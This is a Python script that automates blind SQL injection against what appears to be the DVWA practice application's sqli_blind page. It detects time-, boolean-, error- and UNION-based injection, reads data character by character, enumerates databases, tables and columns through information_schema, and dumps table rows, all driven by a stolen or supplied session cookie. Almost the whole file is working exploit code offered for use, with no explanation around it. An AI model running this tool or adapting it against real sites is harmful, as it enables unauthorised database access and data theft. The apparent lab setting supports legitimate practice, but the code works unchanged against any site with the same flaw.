#!/usr/bin/env python3
import requests
import time
import sys
import concurrent.futures
import argparse
from threading import Lock
from urllib.parse import quote

class BlindSQLiEnumerator:
    def __init__(self, base_url, cookies, threads=10):
        self.base_url = base_url.rstrip('/')
        self.cookies = cookies
        self.target_url = f"{self.base_url}/vulnerabilities/sqli_blind/"
        self.session = requests.Session()
        self.delay_time = 1
        self.threads = threads
        self.lock = Lock()
        self.injection_type = None  # 'time', 'boolean', 'error', 'content'
        self.true_indicator = None
        self.false_indicator = None
        self.error_indicator = None
        
        # Optimize session
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
    
    def detect_injection_type(self):
        """Detect what type of blind SQL injection is possible"""
        print("[*] Detecting blind SQL injection type...")
        
        # Get baseline response for true and false
        baseline_true, _ = self.send_request("1")
        baseline_false, _ = self.send_request("999999")
        
        if baseline_true and baseline_false:
            self.true_indicator = baseline_true.text
            self.false_indicator = baseline_false.text
        
        tests = [
            # Time-based tests
            ("time", "1' AND SLEEP(1)-- -", "1' AND SLEEP(0.1)-- -"),
            ("time", "1' OR SLEEP(1)-- -", "1' OR SLEEP(0.1)-- -"),
            ("time", "1') AND SLEEP(1)-- -", "1') AND SLEEP(0.1)-- -"),
            
            # Boolean-based tests
            ("boolean", "1' AND '1'='1", "1' AND '1'='2"),
            ("boolean", "1' OR '1'='1", "1' OR '1'='2"),
            ("boolean", "1') AND ('1'='1", "1') AND ('1'='2"),
            
            # Error-based tests
            ("error", "1' AND EXTRACTVALUE(0,CONCAT(0x7e,USER()))-- -", "1"),
            ("error", "1' AND UPDATEXML(0,CONCAT(0x7e,USER()),0)-- -", "1"),
            
            # Content-based (different content length)
            ("content", "1' UNION SELECT 1,2-- -", "999999"),
            ("content", "1' UNION ALL SELECT 1,2-- -", "999999"),
        ]
        
        for inj_type, true_payload, false_payload in tests:
            print(f"  Testing {inj_type}-based...")
            
            if inj_type == "time":
                response_true, time_true = self.send_request(true_payload)
                response_false, time_false = self.send_request(false_payload)
                
                if response_true and response_false:
                    if time_true >= self.delay_time * 0.8 and time_false < self.delay_time * 0.8:
                        print(f"[+] {inj_type.upper()}-based injection detected!")
                        self.injection_type = "time"
                        return True
                        
            elif inj_type == "boolean":
                response_true, _ = self.send_request(true_payload)
                response_false, _ = self.send_request(false_payload)
                
                if response_true and response_false:
                    # Check for differences in response
                    if self.check_boolean_difference(response_true.text, response_false.text):
                        print(f"[+] {inj_type.upper()}-based injection detected!")
                        self.injection_type = "boolean"
                        return True
                        
            elif inj_type == "error":
                response, _ = self.send_request(true_payload)
                if response and self.check_error_response(response.text):
                    print(f"[+] {inj_type.upper()}-based injection detected!")
                    self.injection_type = "error"
                    self.error_indicator = self.extract_error_indicator(response.text)
                    return True
                    
            elif inj_type == "content":
                response_true, _ = self.send_request(true_payload)
                response_false, _ = self.send_request(false_payload)
                
                if response_true and response_false:
                    if self.check_content_difference(response_true.text, response_false.text):
                        print(f"[+] {inj_type.upper()}-based injection detected!")
                        self.injection_type = "content"
                        return True
        
        print("[-] No blind SQL injection detected")
        return False
    
    def check_boolean_difference(self, response1, response2):
        """Check if two responses are different (for boolean-based)"""
        # Simple checks for differences
        if len(response1) != len(response2):
            return True
        
        # Check for specific strings that indicate true/false
        true_markers = ["exists", "found", "success", "user id", "first name", "surname"]
        false_markers = ["missing", "not found", "error", "no results"]
        
        for marker in true_markers:
            if marker in response1.lower() and marker not in response2.lower():
                return True
        
        for marker in false_markers:
            if marker in response2.lower() and marker not in response1.lower():
                return True
        
        # If responses are substantially different
        if response1 != response2:
            diff_count = sum(1 for a, b in zip(response1, response2) if a != b)
            if diff_count > 10:  # More than 10 characters different
                return True
        
        return False
    
    def check_error_response(self, response):
        """Check if response contains SQL error"""
        error_keywords = [
            "sql", "mysql", "syntax", "error", "warning", "exception",
            "xp_", "extractvalue", "updatexml", "~", "concat"
        ]
        
        response_lower = response.lower()
        return any(keyword in response_lower for keyword in error_keywords)
    
    def extract_error_indicator(self, response):
        """Extract error message pattern for error-based injection"""
        # Look for common error patterns
        import re
        
        patterns = [
            r"XPATH syntax error: '([^']+)'",
            r"~([^<]+)",
            r"SQLSTATE\[\d+\]:? ([^<]+)",
            r"error.*?: ([^<]+)",
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                return match.group(1)[:50]  # Return first 50 chars
        
        # If no pattern matches, use a substring
        return response[response.find("error"):response.find("error")+100] if "error" in response.lower() else "error_detected"
    
    def check_content_difference(self, response1, response2):
        """Check if content is different (for content-based/union)"""
        return response1 != response2
    
    def send_request(self, payload, timeout=8):
        """Send request and return response + time"""
        params = {"id": payload, "Submit": "Submit"}
        
        try:
            start = time.time()
            response = self.session.get(
                self.target_url,
                params=params,
                cookies=self.cookies,
                timeout=timeout,
                allow_redirects=False
            )
            elapsed = time.time() - start
            return response, elapsed
        except Exception as e:
            with self.lock:
                print(f"[!] Request error: {e}")
            return None, 0
    
    def test_condition(self, condition):
        """Test a boolean condition based on detected injection type"""
        
        if self.injection_type == "time":
            payload = f"1' AND IF({condition},SLEEP({self.delay_time}),0)-- -"
            _, elapsed = self.send_request(payload)
            return elapsed >= self.delay_time * 0.8
            
        elif self.injection_type == "boolean":
            true_payload = f"1' AND {condition}-- -"
            false_payload = f"1' AND NOT({condition})-- -"
            
            response_true, _ = self.send_request(true_payload)
            response_false, _ = self.send_request(false_payload)
            
            if response_true and response_false:
                return self.check_boolean_difference(response_true.text, response_false.text)
                
        elif self.injection_type == "error":
            payload = f"1' AND IF({condition},EXTRACTVALUE(0,CONCAT(0x7e,USER())),0)-- -"
            response, _ = self.send_request(payload)
            
            if response:
                return self.check_error_response(response.text)
                
        elif self.injection_type == "content":
            payload = f"1' AND {condition}-- -"
            response, _ = self.send_request(payload)
            baseline, _ = self.send_request("1")
            
            if response and baseline:
                return response.text != baseline.text
        
        # Fallback to time-based if detection failed
        print("[*] Using fallback time-based method")
        payload = f"1' AND IF({condition},SLEEP({self.delay_time}),0)-- -"
        _, elapsed = self.send_request(payload)
        return elapsed >= self.delay_time * 0.8
    
    def binary_search_char(self, query, position):
        """Binary search for character"""
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            
            # Test if char >= mid
            condition1 = f"ASCII(SUBSTRING(({query}),{position},1))>={mid}"
            
            if self.test_condition(condition1):
                # Test if char == mid
                condition2 = f"ASCII(SUBSTRING(({query}),{position},1))={mid}"
                
                if self.test_condition(condition2):
                    return chr(mid)
                else:
                    low = mid + 1
            else:
                high = mid - 1
        
        return None
    
    def extract_char_parallel(self, query, position):
        """Extract single character using parallel requests"""
        chars = []
        
        def test_char(ascii_val):
            condition = f"ASCII(SUBSTRING(({query}),{position},1))={ascii_val}"
            if self.test_condition(condition):
                return chr(ascii_val)
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            ascii_range = list(range(32, 127))
            future_to_char = {executor.submit(test_char, asc): asc for asc in ascii_range}
            
            for future in concurrent.futures.as_completed(future_to_char):
                result = future.result()
                if result:
                    chars.append(result)
                    # Cancel remaining futures
                    for f in future_to_char:
                        f.cancel()
                    break
        
        return chars[0] if chars else None
    
    def extract_data(self, query, method="binary"):
        """Extract data with chosen method"""
        result = ""
        position = 1
        
        print(f"[*] Extracting: {query[:50]}...")
        
        while True:
            if method == "binary":
                char = self.binary_search_char(query, position)
            elif method == "parallel":
                char = self.extract_char_parallel(query, position)
            else:  # hybrid
                start_time = time.time()
                char = self.binary_search_char(query, position)
                if time.time() - start_time > 2:
                    print(f"[*] Switching to parallel for position {position}")
                    char = self.extract_char_parallel(query, position)
            
            if not char:
                break
            
            result += char
            sys.stdout.write(f"\r[+] Progress: {position} chars -> '{result}'")
            sys.stdout.flush()
            
            if len(result) > 1000 or (',' in result and len(result.split(',')) > 50):
                break
            
            position += 1
        
        print()
        return result
    
    def test_union_columns(self):
        """Test for UNION-based injection and find number of columns"""
        print("[*] Testing for UNION-based injection...")
        
        for num_cols in range(1, 15):
            # Test with NULL values
            nulls = ",".join(["NULL"] * num_cols)
            payload = f"1' UNION SELECT {nulls}-- -"
            
            response, _ = self.send_request(payload)
            if response and response.status_code == 200:
                # Check if response is different from error
                error_payload = f"999999' UNION SELECT {nulls}-- -"
                error_response, _ = self.send_request(error_payload)
                
                if error_response and response.text != error_response.text:
                    print(f"[+] UNION injection possible with {num_cols} columns")
                    
                    # Try to find string column
                    for i in range(1, num_cols + 1):
                        test_payload = f"1' UNION SELECT {','.join(['NULL']*(i-1) + ['\'test\''] + ['NULL']*(num_cols-i))}-- -"
                        test_response, _ = self.send_request(test_payload)
                        
                        if test_response and "test" in test_response.text:
                            print(f"[+] String column at position {i}")
                            return num_cols, i
        
        print("[-] UNION injection not detected or requires different approach")
        return None, None
    
    def union_extract(self, query, num_cols, string_col):
        """Extract data using UNION technique"""
        print(f"[*] Using UNION technique to extract data...")
        
        # Create payload with query in string column
        columns = []
        for i in range(1, num_cols + 1):
            if i == string_col:
                columns.append(f"({query})")
            else:
                columns.append("NULL")
        
        payload = f"1' UNION SELECT {','.join(columns)}-- -"
        response, _ = self.send_request(payload)
        
        if response:
            # Try to extract the data from response
            # This is a simple extraction - would need customization per target
            lines = response.text.split('\n')
            for line in lines:
                if 'user id' in line.lower() or 'surname' in line.lower():
                    # Look for the extracted data
                    import re
                    # Try to find patterns that might be our data
                    patterns = [
                        r">([^<]+)</pre>",
                        r"<br />([^<]+)",
                        r" : ([^<]+)"
                    ]
                    
                    for pattern in patterns:
                        matches = re.findall(pattern, line)
                        for match in matches:
                            if len(match) > 3 and not match.strip().isdigit():
                                return match.strip()
        
        return None
    
    def get_database_info(self):
        """Get database information"""
        print("\n" + "="*60)
        print("[*] DATABASE ENUMERATION")
        print("="*60)
        
        # Try UNION first if available
        num_cols, string_col = self.test_union_columns()
        if num_cols and string_col:
            print("[*] Attempting UNION-based extraction...")
            
            queries = [
                ("Version", "@@version"),
                ("Database", "database()"),
                ("User", "USER()"),
                ("Hostname", "@@hostname")
            ]
            
            for name, query in queries:
                result = self.union_extract(query, num_cols, string_col)
                if result:
                    print(f"[+] {name}: {result}")
                else:
                    # Fallback to blind extraction
                    print(f"[*] Falling back to blind extraction for {name}...")
                    result = self.extract_data(query, method="parallel")
                    if result:
                        print(f"[+] {name}: {result}")
        else:
            # Use blind technique
            print("[*] Using blind extraction technique...")
            
            bulk_query = """
            SELECT CONCAT_WS('|', 
                @@version, 
                database(),
                USER(),
                @@hostname
            )
            """
            
            print("[*] Extracting bulk info...")
            bulk_result = self.extract_data(bulk_query, method="parallel")
            
            if bulk_result and '|' in bulk_result:
                parts = bulk_result.split('|')
                if len(parts) >= 4:
                    print(f"\n[+] Database Version: {parts[0]}")
                    print(f"[+] Current Database: {parts[1]}")
                    print(f"[+] Current User: {parts[2]}")
                    print(f"[+] Hostname: {parts[3]}")
                    return parts
        
        return []
    
    def get_databases(self):
        """Get all databases"""
        print("\n[*] Extracting all databases...")
        
        query = "SELECT GROUP_CONCAT(schema_name SEPARATOR '|||') FROM information_schema.schemata"
        result = self.extract_data(query, method="parallel")
        
        if result:
            databases = [db for db in result.split('|||') if db]
            print(f"[+] Found {len(databases)} databases")
            return databases
        return []
    
    def get_tables(self, database):
        """Get tables from database"""
        print(f"[*] Extracting tables from '{database}'...")
        
        query = f"SELECT GROUP_CONCAT(table_name SEPARATOR '|||') FROM information_schema.tables WHERE table_schema='{database}'"
        result = self.extract_data(query, method="parallel")
        
        if result:
            tables = [tbl for tbl in result.split('|||') if tbl]
            print(f"[+] Found {len(tables)} tables in '{database}'")
            return tables
        return []
    
    def get_columns(self, database, table):
        """Get columns from table"""
        print(f"[*] Extracting columns from '{database}.{table}'...")
        
        query = f"""
        SELECT GROUP_CONCAT(column_name SEPARATOR '|||') 
        FROM information_schema.columns 
        WHERE table_schema='{database}' AND table_name='{table}'
        """
        result = self.extract_data(query, method="parallel")
        
        if result:
            columns = [col for col in result.split('|||') if col]
            print(f"[+] Found {len(columns)} columns in '{table}'")
            return columns
        return []
    
    def dump_data(self, database, table, columns, limit=10):
        """Dump data from table"""
        print(f"\n[*] Dumping data from '{database}.{table}'...")
        
        columns_str = ', '.join(columns)
        query = f"""
        SELECT GROUP_CONCAT(CONCAT_WS(':::', {columns_str}) SEPARATOR '||||') 
        FROM {database}.{table} 
        LIMIT {limit}
        """
        
        result = self.extract_data(query, method="parallel")
        
        if result:
            rows = result.split('||||')
            print(f"\n[+] Dumped {len(rows)} rows from '{table}':")
            for i, row in enumerate(rows):
                values = row.split(':::')
                print(f"\nRow {i+1}:")
                for col, val in zip(columns, values):
                    print(f"  {col}: {val}")
        else:
            print("[-] Failed to dump data")
    
    def interactive_mode(self):
        """Interactive mode"""
        print("\n" + "="*60)
        print("BLIND SQL INJECTION ENUMERATOR")
        print("="*60)
        
        # Detect injection type
        if not self.detect_injection_type():
            return
        
        print(f"\n[*] Using {self.injection_type.upper()}-based technique")
        
        # Get database info
        print("\n[1/6] Getting database information...")
        self.get_database_info()
        
        # Get databases
        print("\n[2/6] Enumerating databases...")
        databases = self.get_databases()
        
        if not databases:
            print("[!] No databases found")
            return
        
        print("\nDATABASES:")
        for i, db in enumerate(databases, 1):
            print(f"  {i}. {db}")
        
        # Select database
        while True:
            try:
                choice = input("\n[?] Select database number (or 'all'): ").strip()
                if choice.lower() == 'all':
                    selected_dbs = databases
                    break
                elif choice.isdigit() and 1 <= int(choice) <= len(databases):
                    selected_dbs = [databases[int(choice)-1]]
                    break
                else:
                    print(f"[!] Enter 1-{len(databases)} or 'all'")
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                return
        
        # Enumerate tables
        all_tables = []
        for db in selected_dbs:
            print(f"\n[3/6] Enumerating tables in '{db}'...")
            tables = self.get_tables(db)
            
            if tables:
                print(f"\nTABLES in {db}:")
                for i, tbl in enumerate(tables, 1):
                    print(f"  {i}. {tbl}")
                    all_tables.append((db, tbl))
        
        if not all_tables:
            print("[!] No tables found")
            return
        
        # Select table
        print("\n[4/6] Select table to examine...")
        for i, (db, tbl) in enumerate(all_tables, 1):
            print(f"  {i}. {db}.{tbl}")
        
        try:
            table_choice = input("\n[?] Select table number: ").strip()
            if table_choice.isdigit() and 1 <= int(table_choice) <= len(all_tables):
                selected_db, selected_table = all_tables[int(table_choice)-1]
                
                # Get columns
                print(f"\n[5/6] Getting columns from '{selected_db}.{selected_table}'...")
                columns = self.get_columns(selected_db, selected_table)
                
                if columns:
                    # Dump data
                    print(f"\n[6/6] Dumping data from '{selected_db}.{selected_table}'...")
                    self.dump_data(selected_db, selected_table, columns)
                else:
                    print("[!] No columns found")
            else:
                print("[!] Invalid selection")
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
        
        print("\n" + "="*60)
        print("[+] ENUMERATION COMPLETED!")
        print("="*60)

def main():
    parser = argparse.ArgumentParser(description='Advanced Blind SQL Injection Enumerator')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://127.0.0.1:42001)')
    parser.add_argument('-s', '--session', required=True, help='PHPSESSID value')
    parser.add_argument('-l', '--level', default='low', choices=['low', 'medium', 'high'], 
                       help='Security level (default: low)')
    parser.add_argument('-t', '--threads', type=int, default=15, help='Number of threads (default: 15)')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay time for time-based (default: 1.0)')
    
    args = parser.parse_args()
    
    cookies = {
        "PHPSESSID": args.session,
        "security": args.level
    }
    
    print("""
    ADVANCED BLIND SQL INJECTION ENUMERATOR
    Supports: Time-based, Boolean-based, Error-based, Union-based
    """)
    
    # Create enumerator
    enumerator = BlindSQLiEnumerator(args.url, cookies, threads=args.threads)
    enumerator.delay_time = args.delay
    
    # Run interactive mode
    enumerator.interactive_mode()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Script terminated by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()